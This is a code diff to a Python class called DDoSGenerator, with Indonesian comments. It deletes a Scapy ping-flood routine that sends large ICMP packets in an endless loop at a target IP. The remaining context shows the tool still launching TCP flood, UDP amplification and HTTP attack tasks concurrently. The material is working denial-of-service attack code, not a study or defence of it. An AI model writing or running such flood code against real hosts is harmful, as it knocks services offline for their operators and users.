@@ -102,15 +102,6 @@ class DDoSGenerator:
             except Exception as e:
                 print(f"UDP Amplification error: {str(e)}")
 
-    def ping_flood(self):
-        """Teknik Ping Flood dengan ICMP"""
-        while self.running:
-            try:
-                packet = IP(dst=self.target_ip)/ICMP()/(b"X"*60000)  # Large payload for ICMP
-                send(packet, verbose=0)
-            except Exception as e:
-                print(f"Ping Flood error: {str(e)}")
-
     async def start_attack(self):
         """Mulai semua jenis serangan"""
         with ThreadPoolExecutor(max_workers=THREADS) as executor:
@@ -122,9 +113,6 @@ class DDoSGenerator:
             # TCP/UDP Flood
             executor.submit(self.tcp_flood)
             executor.submit(self.udp_amplification)
-            
-            # Ping Flood
-            executor.submit(self.ping_flood)
             
             await asyncio.gather(*http_tasks)
 
